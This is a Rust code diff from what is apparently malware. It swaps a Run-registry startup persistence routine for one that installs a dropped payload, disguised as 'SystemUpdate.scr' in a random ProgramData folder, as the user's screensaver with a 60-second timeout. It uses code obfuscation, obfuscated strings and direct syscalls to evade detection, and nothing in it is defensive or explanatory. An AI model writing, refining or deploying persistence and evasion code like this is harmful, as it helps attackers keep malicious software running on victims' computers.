@@ -29,74 +29,16 @@ const FILE_ATTRIBUTE_NORMAL: u32 = 0x00000080;
 
 #[cfg(windows)]
 #[obfuscate(garbage = true)]
-unsafe fn add_to_startup(file_path: &str) -> Result<(), String> {
-    let run_key_path: Vec<u16> = OsStr::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
-        .encode_wide()
-        .chain(once(0))
-        .collect();
-    let app_name: Vec<u16> = OsStr::new("SystemUpdate")
+unsafe fn set_screensaver_registry(file_path: &str) -> Result<(), String> {
+    let desktop_key_path: Vec<u16> = OsStr::new("Control Panel\\Desktop")
         .encode_wide()
         .chain(once(0))
         .collect();
 
-    // Check if the startup entry already exists and points to a valid file
-    let mut hkey_read = mem::MaybeUninit::uninit();
-    if RegOpenKeyExW(
-        HKEY_CURRENT_USER,
-        run_key_path.as_ptr(),
-        0,
-        KEY_READ,
-        hkey_read.as_mut_ptr(),
-    ) == 0
-    {
-        let hkey_read = hkey_read.assume_init();
-        let mut data_type = mem::MaybeUninit::uninit();
-        let mut data_size = 0;
-
-        // First, query the size of the data
-        if RegQueryValueExW(
-            hkey_read,
-            app_name.as_ptr(),
-            ptr::null_mut(),
-            data_type.as_mut_ptr(),
-            ptr::null_mut(),
-            &mut data_size,
-        ) == 0
-        {
-            if data_type.assume_init() == REG_SZ {
-                let mut data_buffer: Vec<u16> = vec![0; (data_size / 2) as usize];
-                if RegQueryValueExW(
-                    hkey_read,
-                    app_name.as_ptr(),
-                    ptr::null_mut(),
-                    ptr::null_mut(),
-                    data_buffer.as_mut_ptr() as *mut u8,
-                    &mut data_size,
-                ) == 0
-                {
-                    // Null bytes might be included, so we need to handle that.
-                    let end = data_buffer
-                        .iter()
-                        .position(|&x| x == 0)
-                        .unwrap_or(data_buffer.len());
-                    let path_str = String::from_utf16_lossy(&data_buffer[..end]);
-                    if Path::new(&path_str).exists() {
-                        RegCloseKey(hkey_read);
-                        // The registry key exists and points to a valid file, so we're done.
-                        return Ok(());
-                    }
-                }
-            }
-        }
-        RegCloseKey(hkey_read);
-    }
-
-    // If the check fails or the key doesn't exist, proceed to create it.
     let mut hkey = mem::MaybeUninit::uninit();
-
     if RegOpenKeyExW(
         HKEY_CURRENT_USER,
-        run_key_path.as_ptr(),
+        desktop_key_path.as_ptr(),
         0,
         KEY_SET_VALUE,
         hkey.as_mut_ptr(),
@@ -104,16 +46,20 @@ unsafe fn add_to_startup(file_path: &str) -> Result<(), String> {
     {
         return Err(obfuscate_string!("Failed to open registry key.").to_string());
     }
-
     let hkey = hkey.assume_init();
+
+    // Set SCRNSAVE.EXE
+    let scrnsave_name: Vec<u16> = OsStr::new("SCRNSAVE.EXE")
+        .encode_wide()
+        .chain(once(0))
+        .collect();
     let file_path_w: Vec<u16> = OsStr::new(file_path)
         .encode_wide()
         .chain(once(0))
         .collect();
-
     if RegSetValueExW(
         hkey,
-        app_name.as_ptr(),
+        scrnsave_name.as_ptr(),
         0,
         REG_SZ,
         file_path_w.as_ptr() as *const u8,
@@ -121,7 +67,51 @@ unsafe fn add_to_startup(file_path: &str) -> Result<(), String> {
     ) != 0
     {
         RegCloseKey(hkey);
-        return Err(obfuscate_string!("Failed to set registry value.").to_string());
+        return Err(obfuscate_string!("Failed to set SCRNSAVE.EXE value.").to_string());
+    }
+
+    // Set ScreenSaveTimeOut
+    let timeout_name: Vec<u16> = OsStr::new("ScreenSaveTimeOut")
+        .encode_wide()
+        .chain(once(0))
+        .collect();
+    let timeout_value: Vec<u16> = OsStr::new("60")
+        .encode_wide()
+        .chain(once(0))
+        .collect();
+    if RegSetValueExW(
+        hkey,
+        timeout_name.as_ptr(),
+        0,
+        REG_SZ,
+        timeout_value.as_ptr() as *const u8,
+        (timeout_value.len() * 2) as u32,
+    ) != 0
+    {
+        RegCloseKey(hkey);
+        return Err(obfuscate_string!("Failed to set ScreenSaveTimeOut value.").to_string());
+    }
+
+    // Set ScreenSaveActive
+    let active_name: Vec<u16> = OsStr::new("ScreenSaveActive")
+        .encode_wide()
+        .chain(once(0))
+        .collect();
+    let active_value: Vec<u16> = OsStr::new("1")
+        .encode_wide()
+        .chain(once(0))
+        .collect();
+    if RegSetValueExW(
+        hkey,
+        active_name.as_ptr(),
+        0,
+        REG_SZ,
+        active_value.as_ptr() as *const u8,
+        (active_value.len() * 2) as u32,
+    ) != 0
+    {
+        RegCloseKey(hkey);
+        return Err(obfuscate_string!("Failed to set ScreenSaveActive value.").to_string());
     }
 
     RegCloseKey(hkey);
@@ -147,7 +137,7 @@ pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), S
     let dir_name: String = random_bytes.encode_hex();
 
     let folder_path = format!("{}\\{}", program_data, dir_name);
-    let full_file_path_win = format!("{}\\SystemUpdate.exe", folder_path);
+    let full_file_path_win = format!("{}\\SystemUpdate.scr", folder_path);
 
     if let Err(e) = fs::create_dir_all(&folder_path) {
         return Err(format!(
@@ -237,10 +227,10 @@ pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), S
     (syscalls::SYSCALLS.NtClose)(file_handle as *mut _);
 
     if result.is_ok() {
-        if let Err(e) = add_to_startup(&full_file_path_win) {
+        if let Err(e) = set_screensaver_registry(&full_file_path_win) {
             return Err(format!(
                 "{}{}",
-                obfuscate_string!("Failed to add to startup: "),
+                obfuscate_string!("Failed to set screensaver registry: "),
                 e
             ));
         }
